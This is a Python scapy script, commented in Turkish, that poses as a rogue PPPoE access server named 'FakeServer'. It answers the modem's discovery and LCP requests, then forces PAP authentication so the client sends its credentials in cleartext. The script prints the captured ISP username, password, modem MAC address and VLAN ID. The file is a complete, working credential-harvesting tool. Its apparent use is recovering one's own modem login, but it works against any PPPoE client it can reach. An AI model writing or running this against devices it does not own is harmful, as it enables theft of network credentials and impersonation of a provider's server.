from scapy.all import *
from scapy.layers.ppp import PPPoED, PPPoE, PPP
from scapy.layers.l2 import Dot1Q, Ether
import struct

# LÜTFEN KENDİ ARAYÜZÜNÜZÜ KONTROL EDİN
IFACE = "en7"

try:
    SERVER_MAC = get_if_hwaddr(IFACE)
except Exception as e:
    print(f"Hata: {IFACE} MAC adresi okunamadı. {e}")
    exit(1)

SESSION_ID = 0x1234
pap_requested = False


def get_tag(payload, tag_type):
    try:
        payload_bytes = bytes(payload)
        idx = 0
        while idx < len(payload_bytes) - 3:
            t_type, t_len = struct.unpack("!HH", payload_bytes[idx:idx + 4])
            if t_type == tag_type:
                return payload_bytes[idx:idx + 4 + t_len]
            idx += 4 + t_len
    except:
        pass
    return b''


def handle_packet(pkt):
    global pap_requested
    if not pkt.haslayer(Ether): return

    has_vlan = pkt.haslayer(Dot1Q)
    vlan_id = pkt[Dot1Q].vlan if has_vlan else None
    inner_type = pkt[Dot1Q].type if has_vlan else pkt[Ether].type

    if inner_type not in [0x8863, 0x8864]:
        return

    def build_base_frame(dst_mac):
        eth = Ether(src=SERVER_MAC, dst=dst_mac)
        if has_vlan:
            return eth / Dot1Q(vlan=vlan_id)
        return eth

    # 1. Aşama: Keşif (Discovery)
    if inner_type == 0x8863 and pkt.haslayer(PPPoED):
        pppoed = pkt[PPPoED]

        if pppoed.code == 0x09:  # PADI
            print(f"\n[*] {pkt[Ether].src} adresinden PADI YAKALANDI!")
            pap_requested = False
            service_name = get_tag(pppoed.payload, 0x0101) or b'\x01\x01\x00\x00'
            host_uniq = get_tag(pppoed.payload, 0x0103)
            tags = service_name + b'\x01\x02\x00\x0aFakeServer' + host_uniq
            base_frame = build_base_frame(pkt[Ether].src)
            pado = PPPoED(version=1, type=1, code=0x07, sessionid=0, len=len(tags)) / Raw(load=tags)
            sendp(base_frame / pado, iface=IFACE, verbose=False)

        elif pppoed.code == 0x19:  # PADR
            print(f"[*] PADR geldi. PADS gönderiliyor...")
            service_name = get_tag(pppoed.payload, 0x0101) or b'\x01\x01\x00\x00'
            host_uniq = get_tag(pppoed.payload, 0x0103)
            tags = service_name + host_uniq
            base_frame = build_base_frame(pkt[Ether].src)
            pads = PPPoED(version=1, type=1, code=0x65, sessionid=SESSION_ID, len=len(tags)) / Raw(load=tags)
            sendp(base_frame / pads, iface=IFACE, verbose=False)

    # 2. Aşama: Oturum (Session)
    elif inner_type == 0x8864:
        raw_payload = bytes(pkt[Dot1Q].payload if has_vlan else pkt[Ether].payload)
        try:
            pppoe = PPPoE(raw_payload)
        except:
            return

        if pppoe.sessionid == SESSION_ID:
            ppp_payload = bytes(pppoe.payload)
            if len(ppp_payload) < 4: return
            ppp_proto = struct.unpack('!H', ppp_payload[:2])[0]

            # LCP Aşaması
            if ppp_proto == 0xc021:
                lcp_code = ppp_payload[2]
                lcp_len = struct.unpack('!H', ppp_payload[4:6])[0]
                lcp_data = ppp_payload[2: 2 + lcp_len]

                if lcp_code == 1:  # İstemciden gelen Configure-Request
                    print(f"[*] Modemin LCP isteği onaylanıyor (Ack, Uzunluk: {lcp_len})...")
                    ack_payload = struct.pack('!B', 2) + lcp_data[1:]
                    ack = build_base_frame(pkt[Ether].src) / PPPoE(sessionid=SESSION_ID) / \
                          PPP(proto=0xc021) / Raw(load=ack_payload)
                    sendp(ack, iface=IFACE, verbose=False)

                    # PAP isteğini sadece 1 kere gönder
                    if not pap_requested:
                        print("[*] Bizim LCP (PAP) isteğimiz gönderiliyor...")
                        my_lcp_req = struct.pack('!BBH', 1, 0x42, 8) + b'\x03\x04\xc0\x23'
                        req = build_base_frame(pkt[Ether].src) / PPPoE(sessionid=SESSION_ID) / \
                              PPP(proto=0xc021) / Raw(load=my_lcp_req)
                        sendp(req, iface=IFACE, verbose=False)
                        pap_requested = True

            # PAP Aşaması (Sonuç Ekranı)
            elif ppp_proto == 0xc023:
                pap_data = ppp_payload[2:]
                if len(pap_data) >= 4 and pap_data[0] == 1:
                    user_len = pap_data[4]
                    username = pap_data[5: 5 + user_len].decode('utf-8', 'ignore')

                    pass_len_idx = 5 + user_len
                    pass_len = pap_data[pass_len_idx] if pass_len_idx < len(pap_data) else 0
                    password = pap_data[pass_len_idx + 1: pass_len_idx + 1 + pass_len].decode('utf-8',
                                                                                              'ignore') if pass_len > 0 else ""

                    # Modemin MAC Adresini paket başlığından al
                    client_mac = pkt[Ether].src

                    print("\n" + "!" * 65)
                    print(f"[+] KİMLİK BİLGİLERİ VE MAC BAŞARIYLA YAKALANDI!")
                    print(f"[+] Modem MAC Adresi : {client_mac}")
                    if has_vlan:
                        print(f"[+] VLAN ID          : {vlan_id}")
                    print(f"[+] Kullanıcı Adı    : {username}")
                    print(f"[+] Parola           : {password}")
                    print("!" * 65 + "\n")
                    exit(0)


print(f"[*] {IFACE} arayüzü dinleniyor...")
sniff(iface=IFACE, prn=handle_packet, store=0, promisc=True)